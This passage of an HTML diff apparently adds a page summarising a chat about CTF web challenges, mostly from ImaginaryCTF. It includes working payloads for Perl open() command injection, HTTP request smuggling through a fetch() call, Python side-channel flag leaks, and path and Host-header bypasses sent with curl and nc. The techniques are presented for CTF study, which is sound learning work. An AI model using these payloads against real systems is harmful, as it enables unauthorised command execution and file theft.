+            <p><strong>Vulnerability:</strong> Command Injection in Perl's `open` function.</p>
+            <p>The core vulnerability lies in how Perl's `open` function can be manipulated to execute shell commands. The solution involves appending a pipe character (`|`) to the input string, which the server-side script then interprets as a command pipeline. Payloads were crafted to list directory contents (`ls -la`) or read the flag file (`cat /flag*`).</p>
+            <p><strong>Example Payloads:</strong></p>
+            <pre><code style="display: block; background-color: #f4f4f4; padding: 1em; border-radius: 5px; white-space: pre-wrap; word-break: break-all;">http://pearl.chal.imaginaryctf.org/%0A&lt;command&gt;%7C</code></pre>
+            <pre><code style="display: block; background-color: #f4f4f4; padding: 1em; border-radius: 5px; white-space: pre-wrap; word-break: break-all;">$ curl -s --path-as-is 'http://127.0.0.1:8080/%0als%20-la%20/|'</code></pre>
+            <p><strong>Resource:</strong> A link was shared to explain this specific behavior in Perl: <a href="https://www.shlomifish.org/lecture/Perl/Newbies/lecture4/processes/opens.html" target="_blank" rel="noopener noreferrer">Perl `open` documentation</a>.</p>
+        </article>
+
+        <article style="margin-bottom: 2em; border-left: 3px solid #ccc; padding-left: 1em;">
+            <h4>Challenge: "imaginary-notes" (ImaginaryCTF)</h4>
+            <p><strong>Vulnerability:</strong> HTTP Request Smuggling via Header Injection.</p>
+            <p>The objective was to register a user by smuggling a complete HTTP `POST` request within the body of another request. A clever part of the exploit involved using the `Accept` header, which is a <a href="https://developer.mozilla.org/en-US/docs/Glossary/CORS-safelisted_request_header" target="_blank" rel="noopener noreferrer">CORS-safelisted header</a>. By setting the `Accept` header to a repeating multi-byte character (`ó`), its byte-length could be precisely controlled to match the length of the smuggled request body, thereby satisfying a server-side length check and allowing the inner `POST /register` request to be processed by the server.</p>
+            <p><strong>Client-side JavaScript Exploit:</strong></p>
+            <pre><code style="display: block; background-color: #f4f4f4; padding: 1em; border-radius: 5px; white-space: pre-wrap; word-break: break-all;" class="language-javascript">(async function () {
+    const injected =
+        "POST /register HTTP/1.1\\r\\n" +
+        "Host: 127.0.0.1:8080\\r\\n" +
+        "X-Username: admin\\r\\n" +
+        "X-Password: pwned\\r\\n" +
+        "Content-Length: 0\\r\\n" +
+        "\\r\\n";
+
+    await fetch("http://localhost:8080/register", {
+        method: 'POST',
+        body: injected,
+        headers: {
+            "Accept": "ó".repeat(injected.length),
+        },
+    });
+})();</code></pre>
+            <p>An alternative solution using Python with `pwn` tools was also shared, demonstrating a more complex interaction involving HTTP pipelining to achieve the same goal.</p>
+        </article>
+
+        <article style="margin-bottom: 2em; border-left: 3px solid #ccc; padding-left: 1em;">
+            <h4>Challenge: "p2c" / python-to-color (ImaginaryCTF)</h4>
+            <p><strong>Vulnerability:</strong> Information Leak via Side-Channel in a Code Execution Environment.</p>
+            <p>This challenge executed user-submitted Python code and returned an RGB color based on the output. This feedback loop was exploited as a side-channel to exfiltrate the flag, character by character, using two different methods.</p>
+            <p><strong>Solution 1 (Monkey Patching):</strong> This approach conditionally alters the program's behavior. It checks one character of the flag at a time. If the guess is correct, it monkey-patches a core function (`parse.int`) to always return 0. This change produces a predictable, unique color, confirming the guessed character. The attacker iterates through all printable characters for each position to reconstruct the flag.</p>
+            <pre><code style="display: block; background-color: #f4f4f4; padding: 1em; border-radius: 5px; white-space: pre-wrap; word-break: break-all;" class="language-python"># Simplified Logic
+import parse
+found = False
+flag = open("flag.txt").read().strip()
+if flag[INDEX] == CHAR:
+    found = True
+def a(*args):
+    return 0
+if found:
+    parse.int = a</code></pre>
+            <p><strong>Solution 2 (Fixed Random Seed):</strong> This method exploits a fixed random seed (`random.seed(0)`). The attacker first generates a local lookup table mapping each possible character to its resulting RGB value under the fixed seed. Then, for each position in the flag, they submit code that reads that single character and processes it. By matching the returned color to the pre-computed table, the character is identified.</p>
+            <pre><code style="display: block; background-color: #f4f4f4; padding: 1em; border-radius: 5px; white-space: pre-wrap; word-break: break-all;" class="language-python"># Simplified Logic
+import random
+random.seed(0)
+with open("/app/flag.txt", "r") as f:
+    return f.read()[{i}] # i = flag index</code></pre>
+        </article>
+
+        <article style="margin-bottom: 2em; border-left: 3px solid #ccc; padding-left: 1em;">
+            <h4>Challenge: "readme" &amp; "readme2" (ImaginaryCTF)</h4>
+            <p><strong>Vulnerability:</strong> Path Normalization and Host Header Parsing Flaws.</p>
+            <p>For "readme", the intended solution was a path normalization bypass. Appending `/.` to the requested file path (`flag.txt/.`) tricked the server's path handling logic into serving the file.</p>
+            <pre><code style="display: block; background-color: #f4f4f4; padding: 1em; border-radius: 5px; white-space: pre-wrap; word-break: break-all;">curl --path-as-is 'http://readme.chal.imaginaryctf.org/flag.txt/.'</code></pre>
+            <p>For "readme2", the vulnerability was in the server's parsing of the `Host` header. By injecting a tab character (`\t`) into the header, an attacker could manipulate the file path being requested, bypassing restrictions and reading `flag.txt`.</p>
+            <pre><code style="display: block; background-color: #f4f4f4; padding: 1em; border-radius: 5px; white-space: pre-wrap; word-break: break-all;">printf 'GET /.. HTTP/1.0\\r\\nHost: fakehost/fla\\tg.txt\\r\\n\\r\\n' | nc readme2.chal.imaginaryctf.org 80</code></pre>
+            <p>An alternative bypass for "readme2" was also found, exploiting how `new URL("x:foobar")` parses the pathname as `"foobar"`, which lacks a leading `/` and could circumvent server-side checks.</p>
+        </article>
+
+    </section>
+
+    <section>
+        <h3>General Security Topics &amp; Resources</h3>
+        <ul>
+            <li><strong>XS-Leaks:</strong> The <a href="https://xsleaks.dev/docs/attacks/navigations/#inflation-server-side-errors" target="_blank" rel="noopener noreferrer">XS-Leaks Wiki</a> was referenced, specifically the page on navigation-based attacks that use server-side errors to leak cross-origin information.</li>
+            <li><strong>Character Encoding:</strong> A discussion on a challenge named "forms" highlighted the critical role of character set encoding in security. The linked <a href="https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/" target="_blank" rel="noopener noreferrer">SonarSource article</a> was shared to explain how encoding discrepancies can lead to vulnerabilities like Cross-Site Scripting (XSS).</li>
+            <li><strong>Prolog Vulnerabilities:</strong> A <a href="https://www.swi-prolog.org/pldoc/man?predicate=format/2" target="_blank" rel="noopener noreferrer">format string vulnerability</a> in SWI-Prolog's `format/2` predicate was mentioned as a potential attack vector in a relevant challenge.</li>
+            <li><strong>CTF Write-ups:</strong> Several links to comprehensive write-ups were shared, providing detailed solutions for multiple challenges:
+                <ul>
+                    <li><a href="https://siunam321.github.io/ctf/ImaginaryCTF-2024/" target="_blank" rel="noopener noreferrer">siunam321's ImaginaryCTF 2024 Write-ups</a></li>
+                    <li><a href="https://nullbrunk.github.io/posts/imaginaryctf-2025-codenames-2/" target="_blank" rel="noopener noreferrer">nullbrunk's "codenames-2" Write-up</a></li>
+                    <li><a href="https://yun.ng/c/ctf/2024-ictf/web/journal" target="_blank" rel="noopener noreferrer">yun.ng's ICTF 2024 Write-ups (Journal, Amazing Race, etc.)</a></li>
+                </ul>
+            </li>
+        </ul>
+    </section>
+
+    <section>
+        <h3>Other Unresolved CTF Queries</h3>
+        <p>The conversation also included requests for help on other challenges, for which detailed solutions were not provided in the text:</p>
+        <ul>
+            <li><strong>Harpia Tech:</strong> A user was stuck on a challenge involving a private PGP key and encrypted backups, needing to find login credentials.</li>
+            <li><strong>Securinets CTF:</strong> Challenges named "Timeworn Code", "0 &amp; 1", and "Securinets" were listed with their respective URLs.</li>
+            <li><strong>0day marketplace (CaspianCTF):</strong> A request for help on a challenge involving a marketplace for 0-day exploits.</li>
+            <li>General connectivity and access issues with various challenge sites were also reported by users.</li>
+        </ul>
+    </section>
+</div>
+  </section>
+  <script>
+    // Force chat to start at the bottom (newest messages)
+    const chat = document.getElementById("chat");
+    chat.scrollTop = chat.scrollHeight;
+  </script>
+</body>
+</html>
